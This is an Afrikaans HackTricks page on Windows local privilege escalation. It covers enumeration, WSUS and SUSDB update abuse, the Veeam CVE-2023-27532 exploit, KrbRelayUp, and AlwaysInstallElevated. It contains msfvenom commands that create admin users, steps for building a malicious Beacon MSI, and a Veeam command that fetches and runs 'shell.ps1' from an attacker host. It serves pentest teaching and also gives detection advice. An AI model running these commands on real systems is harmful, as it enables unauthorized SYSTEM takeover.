# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste hulpmiddel om Windows local privilege escalation vectors te vind:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Hierdie bladsy versamel algemene Windows privilege-escalation-metodologie uit verskeie grondliggende gidse.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Die praktiese enumerasievloei put ook uit gemeenskapswerkswinkels en kontrolelyste.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Die historiese aanvalmateriaal sluit die DerbyCon-aanbieding oor Windows privilege escalation in.<sup>[[5]](#references)</sup>

## Aanvanklike Windows-teorie

### Access Tokens

**As jy nie weet wat Windows access tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Gaan na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**As jy nie weet wat integrity levels in Windows is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-sekuriteitskontroles

Daar is verskillende dinge in Windows wat jou kan **verhinder om die stelsel te enumereer**, uitvoerbare lêers te laat loop of selfs **jou aktiwiteite op te spoor**. Jy behoort die volgende **bladsy te lees** en al hierdie **verdedigingsmeganismes te enumereer** voordat jy met die privilege-escalation-enumerasie begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fisiese toegang kan ook ’n vanlyn UEFI NVRAM-wysiging omskep in pre-boot DMA en ’n Windows `SYSTEM`-geheue-patching-ketting:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-prosesse wat deur `RAiLaunchAdminProcess` geloods word, kan misbruik word om sonder aanwysings High IL te bereik wanneer AppInfo se secure-path-kontroles omseil word. Gaan hier na die toegewyde UIAccess/Admin Protection-bypass-werkvloei:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility-registerpropagering kan misbruik word vir ’n arbitrêre SYSTEM-registerskrywing (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Onlangse Windows-bouweergawes het ook ’n **SMB arbitrary-port** LPE-roete bekendgestel waar ’n bevoorregte plaaslike NTLM-verifikasie oor ’n hergebruikte SMB TCP-verbinding gereflekteer word:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Stelselinligting

### Weergawe-inligting-enumerasie

Kyk of die Windows-weergawe enige bekende kwesbaarheid het (kyk ook na die toegepaste patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Weergawe Exploits

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is nuttig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede te vind. Hierdie databasis bevat meer as 4 700 sekuriteitskwesbaarhede en wys die **massiewe aanvaloppervlak** wat ’n Windows-omgewing bied.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — inventariseer die OS-bouweergawe, geïnstalleerde opdaterings en moontlike relevante sekuriteitsadvies; verifieer die presiese produk en vervangende opdaterings voordat jy aanvaar dat ’n resultaat van toepassing is.

Vir ’n weergawe-spesifieke plaaslike exploit, gaan die **argitektuur van die lopende proses** sowel as die OS-argitektuur na. Op 64-bis Windows is ’n 32-bis proses onderhewig aan [WOW64-lêerstelselherleiding](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verwys gewoonlik na die 32-bis-stelselgids, terwyl `%windir%\Sysnative` daardie proses toegang tot die oorspronklike stelselgids gee. Die alias is nie vir ’n 64-bis proses beskikbaar nie. ’n OS-bouweergawe of kandidaat-opdatering met ’n ontbrekende KB bewys nie dat die stelsel ontginbaar is nie; vergelyk die lopende bouweergawe, geïnstalleerde of vervangende opdatering, prosesargitektuur en exploit-voorvereistes met die [Microsoft-sekuriteitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) vir die presiese kwessie.

**Plaaslik met stelselinligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-bewaarplekke met exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Is enige credentials/Juicy-inligting in die omgewingsveranderlikes gestoor?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-geskiedenis

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript-lêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` is slegs ’n voorbeeld. [PowerShell-transkripsiebeleid](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) skryf gewoonlik na elke gebruiker se Documents-lêergids, maar ’n `OutputDirectory`-instelling of `Start-Transcript -OutputDirectory` kan lêers na ’n gedeelde of versteekte lêergids herlei. Gaan die effektiewe uitvoerpad en lêer-ACL na voordat jy ’n transkripsie nagaan: dit kan opdragargumente en uitvoer bevat, insluitend geloofsbriewe. ’n Leesbare transkripsie is slegs ’n leidraad as die inhoud ’n bruikbare identiteit met hoër voorregte bekend maak en daardie identiteit in die relevante konteks kan aanmeld.

### Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word aangeteken, insluitend uitgevoerde opdragte, opdragaanroepe en dele van skripte. Volledige uitvoeringsbesonderhede en uitvoerresultate word egter moontlik nie vasgelê nie.

Om dit te aktiveer, volg die instruksies in die afdeling "Transkripsielêers" van die dokumentasie en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Om die laaste 15 gebeurtenisse uit PowerShell-logboeke te sien, kan jy die volgende uitvoer:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

’n Volledige aktiwiteitsrekord en die volledige inhoud van die script se uitvoering word vasgelê, wat verseker dat elke kodeblok gedokumenteer word terwyl dit loop. Hierdie proses behou ’n omvattende ouditspoor van elke aktiwiteit, wat waardevol is vir forensiese ondersoeke en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Loggebeure vir die Script Block kan in die Windows Event Viewer by die pad **Application and Services Logs > Microsoft > Windows > PowerShell > Operational** gevind word.\
Om die laaste 20 gebeurtenisse te sien, kan jy die volgende gebruik:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internetinstellings

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Skywe

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

’n HTTP WSUS-endpunt is ’n leidraad vir ondersoek na onderskepping van opdateringmetadata. Uitbuiting hang ook daarvan af of die kliënt daardie WSUS-bediener gebruik, of ’n aanvaller die verkeer kan onderskep of beheer, en van die kliënt se vertroue in opdaterings en installasiebeleid. Die URL alleen bewys nie dat kode-uitvoering moontlik is nie. [Microsoft beveel TLS vir WSUS-metadata aan](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Jy begin deur na te gaan of die netwerk ’n nie-SSL WSUS-opdatering gebruik deur die volgende in cmd uit te voer:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Of die volgende in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

As jy ’n antwoord soos een van hierdie kry:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Wanneer `UseWUServer` `1` is, gebruik Windows Update die ingestelde intranetdiens. Dit bevestig ’n voorvereiste vir die HTTP-interception-pad, maar bewys nie dat interception, die aanvaarding van kwaadwillige opdaterings of installasie met verhoogde regte moontlik is nie. Wanneer dit `0` is, word hierdie spesifieke ingestelde WSUS-eindpunt nie deur daardie beleid gekies nie.

Om hierdie kwesbaarhede uit te buit, kan jy nutsgoed soos [Wsuxploit](https://github.com/pimps/wsuxploit) en [pyWSUS ](https://github.com/GoSecure/pywsus) gebruik - dit is MiTM-exploit-skripte wat met kwaadwillige kode toegerus is om ‘vals’ opdaterings in nie-SSL WSUS-verkeer in te spuit.

Lees die navorsing hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lees die volledige verslag hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Basies is dit die fout wat hierdie kwesbaarheid uitbuit:

> As ons die bevoegdheid het om ons plaaslike gebruikersproxy te wysig, en Windows Updates die proxy gebruik wat in Internet Explorer se instellings opgestel is, het ons dus die bevoegdheid om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te laat loop om ons eie verkeer te onderskep en kode as ’n gebruiker met verhoogde regte op ons stelsel uit te voer.
>
> Verder, aangesien die WSUS-diens die huidige gebruiker se instellings gebruik, sal dit ook die gebruiker se sertifikaatstoor gebruik. As ons ’n selfondertekende sertifikaat vir die WSUS-gasheernaam genereer en hierdie sertifikaat by die huidige gebruiker se sertifikaatstoor voeg, sal ons beide HTTP- en HTTPS-WSUS-verkeer kan onderskep. WSUS gebruik geen HSTS-agtige meganismes om ’n trust-on-first-use-tipe validering op die sertifikaat toe te pas nie. As die gebruiker die aangebiedde sertifikaat vertrou en dit die korrekte gasheernaam het, sal die diens dit aanvaar.

Jy kan hierdie kwesbaarheid uitbuit met die nutsding [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (sodra dit vrygestel is).

### WSUS-opdaterings wat deur ’n administrateur beheer word

’n Afsonderlike pad bestaan wanneer die huidige identiteit op ’n WSUS-bediener opdaterings kan **publiseer en goedkeur**. Gaan na of die identiteit effektief lid is van die bediener se `WSUS Administrators`-groep en enige gedelegeerde WSUS-toestemmings het, en bepaal dan watter kliëntrekenaargroep ’n goedgekeurde opdatering sal ontvang. [Microsoft vereis WSUS Administrator-regte om opdaterings goed te keur](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), en [dokumenteer die vertrouensverhouding vir publisering](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): kliënte moet die ondertekensertifikaat vertrou wat vir plaaslik gepubliseerde inhoud gebruik word. Bevestig dat die kandidaat-opdatering onderteken en aanvaar word, op die teiken van toepassing is en in ’n meer bevoorregte konteks geïnstalleer word voordat jy dit as ’n pad vir privilege escalation beskou. ’n HTTP-`WUServer`-waarde of groepnaam alleen bevestig nie hierdie voorwaardes nie.

### Misbruik van SUSDB-aangepaste opdaterings: ongetekende loonvragte via `.txt`/`.esd`

Dit is ’n ander fout in die vertrouensgrens as die onderskepping van ’n HTTP-WSUS-verbinding: die voorvereiste is voldoende toegang tot die **WSUS-databasis (`SUSDB`) se gestoorde prosedures** om ’n aangepaste opdatering te publiseer en goed te keur. Een praktiese toegangsroete is om ’n stroomop-WSUS-rekenaarrekening na ’n afsonderlike MSSQL-bediener wat `SUSDB` huisves, te relê; die presiese voorvereiste hang van die ontplooiing af, so lys eers die `EXECUTE`-toestemmings in plaas daarvan om SQL-administrateurregte te veronderstel.<sup>[[38]](#references)[[39]](#references)</sup>

Vir die afsonderlike aanvalspad wat WSUS-kliëntverifikasie van HTTP/8530 na LDAP, SMB of AD CS relê, sien [Misbruik van WSUS HTTP vir NTLM-relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Bou, teiken en keur die opdatering goed

Die proses vir aangepaste opdaterings gebruik wettige WSUS-prosedures as ’n beperkte publiseer-API. Die belangrike toestandsoorgange is:<sup>[[38]](#references)</sup>

| Stadium | Relevante gestoorde prosedures |
| --- | --- |
| Voer opdateringmetadata in | `spImportUpdate` |
| Stoor voorvereiste, gelokaliseerde en uitgebreide XML-fragmente | `spSaveXMLFragment` |
| Koppel die inhouddigest aan die aanvallerbeheerde URL | `spSetBatchURL` |
| Lys/skep ’n rekenaargroep en voeg die kliënt by | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Keur installasie vir daardie groep goed | `spDeployUpdate` met `@actionID = 0` en `@isAssigned = 1` |

Die lêernaam, digeste, grootte en `CommandLineInstallation`-hanteerder moet ooreenstem in die ingevoerde metadata en fragmente. Nadat die inhoud-URL en teikengroep toegeken is, lyk die finale goedkeuring soos volg; gebruik nuwe opdaterings-, groep- en ontplooiingsidentifiseerders eerder as om voorbeeld-GUID’s te hergebruik.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uitbreidingsgedrewe handtekeningomseiling

WSUS verwerp normaalweg arbitrêre, ongetekende uitvoerbare inhoud. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` stel die .NET `VerifyFile`-pad egter sy sertifikaatkontrolevlag op false wanneer die verskafde lêernaam op `.txt` of `.esd` eindig; `CheckCertificateSignature` word dan oorgeslaan sonder om eers vas te stel dat die grepe teks of ’n geldige ESD-beeld is. ’n Onveranderde PE met byvoorbeeld die naam `payload.exe.txt` kan dus inhoudverifikasie slaag en later deur die opdatering se opdragreël-installasiehanteerder geloods word. Dit is ’n beleid-/tipeverwarringsfout, nie vervalsing van ’n handtekening nie.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-versoenbare voorbereiding en outomatisering

Deur `spDeployUpdate` aan te roep, laat WSUS die geregistreerde inhoud ophaal. Die oorsprong moet aan BITS se HTTP-verwagtinge voldoen: ’n URL wat bereikbaar is, is nie genoeg nie, want die oordrag gebruik ’n aanvanklike `HEAD`-/`GET`-vloei en byte-reeksversoeke. ’n Bediener sonder Range-ondersteuning lewer WSUS-sinchronisasie-`EventId=364`, met die vermelding dat BITS die Range-protokolopskrif vereis.<sup>[[39]](#references)</sup>

Die navorsings-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genereer die SQL wat nodig is vir die import/fragment/URL/groep/ontplooiingsketting, sluit ’n gewysigde MSSQL-kliënt in om dit uit te voer, en verskaf `BitsWebServer.py` vir inhoudvoorbereiding. ’n Minimale aanroeping vir ’n gemagtigde laboratorium is:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Onbewaakte uitvoering en volharding deur herprobeer

Kliëntkantinteraksie hang van die beleid af. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opsie `4 - Auto download and schedule install`, laat ’n goedgekeurde update aflaai en volgens die opgestelde skedule installeer sonder dat die gebruiker dit handmatig hoef te kies. In toetsing is ’n payload waarvan die update misluk/onvolledig gebly het, onmiddellik weer aangebied nadat die callback-proses geëindig het, dus kan herprobeergedrag herhalende uitvoeringsvolharding word; dit is raserig omdat die kliënt ’n update-failed-status wys.<sup>[[39]](#references)</sup>

#### Opsporing- en verhardingspivots

Nuttige bediener- en kliëntkantpivots uit hierdie ketting is:<sup>[[39]](#references)</sup>

- Oudit die uitvoering van `spCreateTargetGroup`, `spSetBatchURL` en `spDeployUpdate` in `SUSDB`; ondersoek nuwe teikengroepe, eksterne inhoudsoorspronge, `.txt`/`.esd`-update-payloads en ontplooiings deur onverwagte principals (veral nie-rekeninge).
- Gaan `C:\Program Files\Update Services\LogFiles` na vir `ContentSyncAgent`, `FileVerified`, die verkeerd gespelde `FileVerficationFailed` en `EventId=364`; korreleer verifikasie met payload-uitbreiding en inhoudsmagic eerder as om die agtervoegsel te vertrou.
- Soek na Windows Update-installasies wat herhaaldelik misluk/herprobeer, en na PE-uitvoering of onverwagte kinderproses-/netwerkaktiwiteit vanuit inhoud met `.txt`- of `.esd`-name.
- Vereis Extended Protection for Authentication op die databasisdiens waar dit ondersteun word, en beperk databasistoegang oor die netwerk tot die WSUS-bediener en gemagtigde administratiewe stelsels. Minimaliseer en oudit `EXECUTE`-regte op die prosedures vir pasgemaakte updates.

## Derdeparty-outo-opdateerders en agent-IPC (local privesc)

Baie ondernemingsagente stel ’n localhost-IPC-koppelvlak en ’n bevoorregte update-kanaal bloot. As inskrywing na ’n aanvallerbediener gedwing kan word en die opdateerder ’n rogue root CA of swak signer-kontroles vertrou, kan ’n plaaslike gebruiker ’n kwaadwillige MSI aflewer wat die SYSTEM-diens installeer. Sien ’n veralgemeende tegniek (gebaseer op die Netskope stAgentSvc-ketting – CVE-2025-0309) hier:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam Backup & Replication en Cloud Connect gebruik by verstek ’n kernrugsteundiens op **TCP/9401**. [Veeam se advies](https://www.veeam.com/kb4424) beskryf die ongeverifieerde openbaarmaking van geënkripteerde databasisbewyse in die rugsteannetwerkperimeter; ’n afsonderlike openbare PoC demonstreer ’n pad na opdraguitvoering as **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Die diens kan aan meer as localhost bind, so kontroleer sy werklike adres en PID.

- **Verkenning**: bevestig dat TCP/9401 aan `Veeam.Backup.Service.exe` behoort, en inspekteer dan die geïnstalleerde produk en pleistermetadata. `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` is leidrade, nie ’n volledige pleisterkontrole nie.
- **Vaste minimumweergawes**: Veeam lys **11a build 11.0.1.1261 P20230227** en **12 build 12.0.0.1420 P20230223** as die eerste reggestelde weergawes; vroeëre weergawes word geraak. ’n Lêerweergawe met vier komponente alleen kan nie ’n ongepleisterde basisbou van ’n latere pleister op dieselfde bou-nommers onderskei nie. Verifieer die pleisteridentifiseerder teen die [verskaffer se boubeskiedenis](https://www.veeam.com/kb2680) voordat ’n grensbou as reggestel beskou word.
- **Uitbuiting**: plaas ’n PoC soos `VeeamHax.exe` saam met die vereiste Veeam-DLL’s in dieselfde gids, en aktiveer dan ’n SYSTEM-payload oor die plaaslike socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Die aangehaalde PoC demonstreer opdraguitvoering as SYSTEM wanneer die bykomende voorvereistes geld; die verskaffer se advies beskryf die geloofsbriewe-openbaarmakingskwessie.
## KrbRelayUp

’n Plaaslike Kerberos-relay kan van ’n aanmelding met laer voorregte oorgaan na ’n bevoorregte skryfbewerking in die gids wanneer ’n geskikte COM-bediener verifieer en die gerelayde prinsipal regte op die teikenobjek het. [KrbRelay dokumenteer](https://github.com/cube0x0/KrbRelay) beide RBCD- en `msDS-KeyCredentialLink`-LDAP-skryfbewerkings (shadow-credential); KrbRelayUp outomatiseer sommige van hierdie paaie. ’n RBCD-ketting vereis toepaslike delegering en regte op die teikenobjek, terwyl ’n shadow-credential-ketting skryfreghte vir sleutelbewyse en ’n KDC vereis wat die sertifikaatverifikasiepad ondersteun. Geen van die paaie volg bloot uit domeinlidmaatskap nie.

Gaan die werklike DC se beleid vir [LDAP-ondertekening](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) en [LDAPS-kanaalbinding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) na, asook die gerelayde identiteit se objek-ACL en die gekose COM-klas se verifikasie- en nabootsingsvlakke. Die oproeper se aanmeldtipe en geloofsbriewekonteks is belangrik: ’n WinRM-sessie kan anders optree as ’n interaktiewe aanmelding of ’n aanmelding met nuwe geloofsbriewe. Firewall-/OXID-roetering en geïnstalleerde opdaterings kan ook die resultaat verander. Beskou ’n permissiewe beleid of ’n ooreenstemmende ACL as ’n kandidaat vir hersiening; passiewe enumerasie behoort nie COM-dwang, relay-verifikasie of gidsskryfbewerkings te aktiveer nie. ’n Masjienrekening se shadow credential kan tot ’n masjienkaartjie lei, en slegs as daardie rekening die vereiste gidsreplikasieregte het, tot ’n afsonderlike DCSync-pad.

Vind die **uitbuiting in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die aanval se verloop, raadpleeg [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**As** hierdie 2 registersleutels **geaktiveer** is (waarde is **0x1**), kan gebruikers met enige voorreg `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **installeer** (uitvoer).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

As jy ’n meterpreter-sessie het, kan jy hierdie tegniek outomatiseer met die module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Gebruik die `Write-UserAddMSI`-opdrag van PowerUP om ’n Windows MSI-binêre lêer in die huidige gids te skep om voorregte te eskaleer. Hierdie skrip skryf ’n vooraf saamgestelde MSI-installeerder uit wat vra dat ’n gebruiker/groep bygevoeg word (dus sal jy GIU-toegang nodig hê):

```
Write-UserAddMSI
```

Voer eenvoudig die geskepte binêre lêer uit om voorregte te eskaleer.

### MSI Wrapper

Lees hierdie tutoriaal om te leer hoe om ’n MSI-wrapper met hierdie nutsgoed te skep. Let daarop dat jy ’n "**.bat**"-lêer kan omvou as jy **slegs** **opdragreëls** wil **uitvoer**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Skep MSI met WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Skep MSI met Visual Studio

- **Genereer** met Cobalt Strike of Metasploit ’n **nuwe Windows EXE TCP-payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekkassie. Kies die **Setup Wizard**-projek en klik **Next**.
- Gee die projek ’n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** as die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Hou aan om **Next** te klik totdat jy by stap 3 van 4 kom (kies lêers om in te sluit). Klik **Add** en kies die Beacon-payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc**-projek in die **Solution Explorer** en verander in **Properties** **TargetPlatform** van **x86** na **x64**.
  - Daar is ander eienskappe wat jy kan verander, soos **Author** en **Manufacturer**, wat die geïnstalleerde toepassing meer wettig kan laat lyk.
- Regsklik op die projek en kies **View > Custom Actions**.
- Regsklik op **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe**-lêer en klik **OK**. Dit sal verseker dat die beacon-payload uitgevoer word sodra die installeerder begin word.
- Verander **Run64Bit** na **True** onder **Custom Action Properties**.
- Laastens, **bou dit**.
  - As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` verskyn, maak seker dat jy die platform op x64 gestel het.

### MSI-installasie

Om die **installasie** van die kwaadwillige `.msi`-lêer in die **agtergrond** uit te voer:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Om hierdie kwesbaarheid uit te buit, kan jy die volgende gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en Opsporingsprogramme

### Ouditinstellings

Hierdie instellings bepaal wat **gelog** word, so jy moet goed oplet.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, dit is interessant om te weet waarheen die logs gestuur word

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator-wagwoorde** en verseker dat elke wagwoord op rekenaars wat aan ’n domein gekoppel is, **uniek, ewekansig en gereeld opgedateer** word. Hierdie wagwoorde word veilig in Active Directory gestoor en is slegs toeganklik vir gebruikers aan wie voldoende toestemmings deur ACLs verleen is, sodat hulle plaaslike admin-wagwoorde kan sien indien hulle gemagtig is.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien dit aktief is, **word wagwoorde in gewone teks in LSASS gestoor** (Local Security Authority Subsystem Service).\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

